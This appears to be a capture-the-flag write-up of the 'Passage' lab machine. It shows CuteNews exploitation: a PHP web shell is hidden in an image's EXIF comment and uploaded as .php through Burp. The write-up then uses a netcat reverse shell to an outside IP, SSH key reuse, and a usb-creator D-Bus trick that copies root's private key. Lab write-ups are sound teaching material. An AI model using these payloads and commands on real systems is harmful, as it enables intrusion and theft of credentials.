We can see two open ports, 22(SSH) and 80(HTTP).

Accessing port 80, we come across a website.

Looking at the source code, we can see the site is running a CMS(Content management system) called 'CuteNews'.

Accessing the CMS directory, we find a login page and the CuteNews version(2.1.2)

Since we don't have valid credentials, let's try creating a new user through the 'Register' button

After getting our initial access on the CMS, we can find an avatar Upload field on the user profile edit page, so we can try uploading a malicious file. (:

We first try uploading PHP files, but it's not possible to get a file with that extension up... Since this is an 'Avatar' upload field we can assume it accepts images, so let's inject malicious code inside our image. Our code runs PHP's system function through the cmd parameter received via GET. For that we'll use exiftool:

● php
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' chu.jpeg;

We can check that we managed to write the comment inside the image:

● shell
exiftool chu.jpeg

Now let's try the upload. First we turn on BurpSuite(proxy) to intercept the request and edit it.

Intercepting our request in Burp we can see the extension being sent is (.jpeg), as the field on the site asks.

Let's change it to .php and forward the request.

We can see the request was successful(200)

Now we just need to access our file to run commands on the server, for that we go to the directory where avatars are saved: http://passage.htb/CuteNews/uploads/avatar_chu_chu.php

We managed to reach our file, now we can pass Linux commands through the pre-defined parameter, in my case 'cmd'. That gives us remote code execution :D

● url
http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=id

Searching for nc, we can see it's installed, so let's try using it to receive a reverse shell.

● shell
http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=whereis nc

Let's open a port on our machine.

● shell
nc -vvnlp 1337

-vv: verbose 2
-n: nodns
-l: listen
-p: port

Now let's send the connection with netcat

● shell
http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=/bin/nc 10.10.14.238 1337 -e /bin/bash

-e: exec 'command'

w00t, we're in!

We can upgrade our shell with python to make it interactive

● shell
python -c 'import pty;pty.spawn("/bin/bash")'

After a while looking for something to escalate privileges, we can find a file called lines, in the directory: /var/www/html/CuteNews/cdata/users/lines

We can tell it's base64, so let's decode it. For that we'll use the site CyberChef

After that, we get a cleaner output containing some hashes:

Listing the /home folder we can tell paul is a valid user, so we try to access it: And we're in!

After that we can find RSA keys to make the SSH connection

Now we can connect via ssh :D

● shell
ssh paul@passage.htb -i id_rsa_paul

After improving our connection using SSH, taking a closer look at the /home/paul/.ssh/ folder we can see there's an authorization file (authorized_keys)... inside it we have a public key.

So now we log in as 'nadav'

● shell
ssh nadav@passage

Now logged in as 'nadav', we start looking for a way to escalate privileges.

Looking at the processes running as root, I noticed there's a process called: 'usb-creator-helper'

● shell
ps aux | grep root

The Article gives us a good hint(even the name of the user \o/)

With that, we can grab root's RSA key.

We can see the file is created as root

● shell
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/chu/chu.txt true

Now we just log in using the key

● shell
ssh root@passage.htb -i id_rsa_root
